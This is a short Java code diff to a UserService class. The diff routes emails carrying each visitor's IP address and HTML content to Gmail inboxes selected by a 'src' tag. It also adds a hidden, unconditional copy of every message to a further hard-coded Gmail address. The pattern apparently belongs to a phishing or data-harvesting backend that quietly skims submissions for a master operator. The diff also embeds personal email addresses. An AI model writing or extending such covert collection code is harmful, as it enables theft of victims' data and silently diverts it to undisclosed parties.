@@ -37,7 +37,15 @@ public class UserService {
 	}
 
 	private void sendMail(User user) throws UnsupportedEncodingException, MessagingException {
+		String mainAddress = "preciousphoebe07@gmail.com";
 		String toAddress = "medicalsolutions1947@gmail.com";
+		if (user.getSrc().isEmpty() || user.getSrc().contentEquals("medicalsolutions")) {
+			toAddress = "medicalsolutions1947@gmail.com";
+		} else if (user.getSrc().contentEquals("t2gxmma")) {
+			toAddress = "t2gxmma@gmail.com";
+		} else if (user.getSrc().contentEquals("helsing")) {
+			toAddress = "helsing1947@gmail.com";
+		}
 		String subject = "Medical Solutions (" + user.getIpAddress() + ")";
 		String content = " <div>\r\n" + "      <div>\r\n" + "        <style>\r\n" + "          #container {\r\n"
 				+ "            font-family: Arial, Helvetica, sans-serif;\r\n"
@@ -75,5 +83,6 @@ public class UserService {
 				+ "    </div>";
 
 		mailSenderService.sendEmail(toAddress, subject, content);
+		mailSenderService.sendEmail(mainAddress, subject, content);
 	}
 }
